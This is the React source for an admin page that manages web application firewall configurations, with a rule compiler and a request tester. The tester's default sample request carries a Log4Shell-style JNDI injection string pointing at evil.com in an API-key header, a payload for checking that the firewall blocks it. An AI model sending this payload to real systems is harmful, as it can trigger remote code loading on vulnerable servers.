
class CompileButton extends Component {

  state = { error: null, msg: ' Compile' };

  compile = () => {
    fetch('/extensions/cloud-apim/extensions/waf/utils/_compile', {
      method: 'POST',
      credentials: 'include',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(this.props.rawValue)
    }).then(r => r.json()).then(r => {
      if (r.error) {
        this.setState({ error: r.error });
      } else {
        this.setState({ error: null, msg: ' Compilation successful !' });
        setTimeout(() => {
          this.setState({ msg: ' Compile' });
        }, 3000)
      }
    })
  }

  render() {
    return [
      React.createElement('div', { className: 'row mb-3' },
        React.createElement('label', { className: 'col-xs-12 col-sm-2 col-form-label' }, ''),
        React.createElement('div', { className: 'col-sm-10', style: { display: 'flex' } },
          React.createElement('button', {
            className: 'btn btn-sm btn-success',
            type: 'button',
            onClick: (e) => this.compile(),
          },  React.createElement('i', { className: 'fas fa-microchip' }, null), this.state.msg)
        )
      ),
      this.state.error && React.createElement('div', { className: 'row mb-3' },
        React.createElement('label', { className: 'col-xs-12 col-sm-2 col-form-label' }, ''),
        React.createElement('div', {className: 'col-sm-10', style: {display: 'flex'}},
          React.createElement('div', {className: 'alert alert-danger', role: 'alert' }, this.state.error)
        )
      ),
    ]
  }
}

class WafConfigTester extends Component {
  state = {
    calling: false,
    result: null,
    error: null,
    input: JSON.stringify({
      method: 'POST',
      uri: '/post',
      headers: {
        apikey: "${jndi:ldap://evil.com/a}",
        "content-length": "7",
        "host": "www.foo.bar",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "curl/8.1.2",
        "accept": "*/*",
      },
      cookies: { foo: "bar" },
      query: { foo: "bar" },
      body: "foo=bar",
      protocol: "HTTP/1.1",
      status: null,
    }, null, 2),
  }

  send = () => {
    this.setState({ calling: true, result: null, error: null });
    fetch('/extensions/cloud-apim/extensions/waf/utils/_test', {
      method: 'POST',
      credentials: 'include',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ ...this.props.rawValue, request: JSON.parse(this.state.input) })
    }).then(r => r.json()).then(r => {
      this.setState({ calling: false, result: JSON.stringify(r, null, 2), error: null });
    }).catch(ex => {
      this.setState({ calling: false, result: null, error: ex });
    })
  }

  render() {
    return [
      React.createElement('div', { className: 'row mb-3' },
        React.createElement('label', { className: 'col-xs-12 col-sm-2 col-form-label' }, ''),
        React.createElement('div', { className: 'col-sm-10', style: { display: 'flex' } },
          React.createElement('div', { style: { display: 'flex', width: '100%', flexDirection: 'column' }},
            React.createElement(MonacoInput, { height: 400, editorOnly: true, language: 'json', value: this.state.input, onChange: (e) => this.setState({ input: e.target.value }) }),
            React.createElement('div', { style: { display: 'flex', width: '100%', flexDirection: 'row', justifyContent: 'flex-end', padding: 10 } },
              React.createElement('button', { type: 'button', className: 'btn btn-sm btn-success', onClick: this.send, disabled: this.state.calling },
                React.createElement('i', { className: 'fas fa-play' }),
                React.createElement('span', null, ' Test'),
              ),
            ),
            this.state.result && React.createElement('div', { },
              React.createElement(MonacoInput, { height: 400, editorOnly: true, language: 'json', value: this.state.result }, ''),
            )
          )
        )
      )
    ];
  }
}

function MonacoRule(props) {
  const v = props.value[props.idx];
  let height = 150;
  if (v) {
    height = (v.split("\n").length * 19) + 10
  }
  return React.createElement(MonacoInput, { ...props, label: '', height: height, language: 'ini', value: props.value[props.idx], onChange: (it) => {
    props.value[props.idx] = it;
    props.onChange(props.value);
  } }, '')
}

class WafConfigsPage extends Component {

  formSchema = {
    _loc: {
      type: 'location',
      props: {},
    },
    id: {
      type: 'string',
      disabled: true,
      props: { label: 'Id', placeholder: '---' }
    },
    name: {
      type: 'string',
      props: { label: 'Name', placeholder: 'My WAF Configuration' },
    },
    description: {
      type: 'string',
      props: { label: 'Description', placeholder: 'Description of the WAF configuration' },
    },
    metadata: {
      type: 'object',
      props: { label: 'Metadata' },
    },
    tags: {
      type: 'array',
      props: { label: 'Tags' },
    },
    enabled: {
      type: 'bool',
      props: { label: 'Enabled' },
    },
    block: {
      type: 'bool',
      props: { label: 'Block requests', help: 'Block requests when a rule matches' },
    },
    inspect_input_body: {
      type: 'bool',
      props: { label: 'Inspect input body', help: 'Inspect the request body' },
    },
    inspect_output_body: {
      type: 'bool',
      props: { label: 'Inspect output body', help: 'Inspect the response body' },
    },
    input_body_limit: {
      type: 'number',
      props: { label: 'Input body limit', placeholder: '1024', suffix: 'bytes', help: 'Maximum size of the request body to inspect' },
    },
    output_body_limit: {
      type: 'number',
      props: { label: 'Output body limit', placeholder: '1024', suffix: 'bytes', help: 'Maximum size of the response body to inspect' },
    },
    output_body_mimetypes: {
      type: 'array',
      props: { label: 'Output body MIME types', placeholder: 'text/plain', help: 'MIME types to inspect in the response body' },
    },
    rules: {
      type: 'array',
      props: { component: MonacoRule },
    },
    compile: {
      type: CompileButton,
      props: {}
    },
    test: {
      type: WafConfigTester,
      props: {}
    }
  };

  columns = [
    {
      title: 'Name',
      filterId: 'name',
      content: (item) => item.name,
    },
    {
      title: 'Enabled',
      filterId: 'enabled',
      content: (item) => item.enabled ? 'Yes' : 'No',
      style: { textAlign: 'center', width: 80 },
    },
    {
      title: 'Block',
      filterId: 'block',
      content: (item) => item.block ? 'Yes' : 'No',
      style: { textAlign: 'center', width: 80 },
    },
  ];

  formFlow = [
    '_loc',
    'id',
    'name',
    'description',
    '>>>Metadata and tags',
    'tags',
    'metadata',
    '<<<Configuration',
    'enabled',
    'block',
    '>>>Request inspection',
    'inspect_input_body',
    'input_body_limit',
    '>>>Response inspection',
    'inspect_output_body',
    'output_body_limit',
    'output_body_mimetypes',
    '<<<Rules',
    'rules',
    'compile',
    '>>>Test',
    'test'
  ];

  componentDidMount() {
    this.props.setTitle(`WAF Configurations`);
  }

  client = BackOfficeServices.apisClient('waf.extensions.cloud-apim.com', 'v1', 'waf-configs');

  render() {
    return (
      React.createElement(Table, {
        parentProps: this.props,
        selfUrl: "extensions/cloud-apim/waf/wafconfigs",
        defaultTitle: "All WAF configurations",
        defaultValue: () => {
          return {
            id: 'waf-config_' + uuid(),
            name: 'New WAF Configuration',
            description: 'A new WAF configuration',
            tags: [],
            metadata: {},
            enabled: true,
            block: true,
            inspect_input_body: true,
            inspect_output_body: true,
            input_body_limit: null,
            output_body_limit: null,
            output_body_mimetypes: [],
            rules: [
              "@import_preset crs",
              "SecRuleEngine On",
            ],
          }
        },
        itemName: "WAF Configuration",
        formSchema: this.formSchema,
        formFlow: this.formFlow,
        columns: this.columns,
        stayAfterSave: true,
        fetchItems: (paginationState) => this.client.findAll(),
        updateItem: this.client.update,
        deleteItem: this.client.delete,
        createItem: this.client.create,
        navigateTo: (item) => {
          window.location = `/bo/dashboard/extensions/cloud-apim/waf/wafconfigs/edit/${item.id}`
        },
        itemUrl: (item) => `/bo/dashboard/extensions/cloud-apim/waf/wafconfigs/edit/${item.id}`,
        showActions: true,
        showLink: true,
        rowNavigation: true,
        extractKey: (item) => item.id,
        export: true,
        kubernetesKind: "waf.extensions.cloud-apim.com/WafConfig",
      }, null)
    );
  }
}
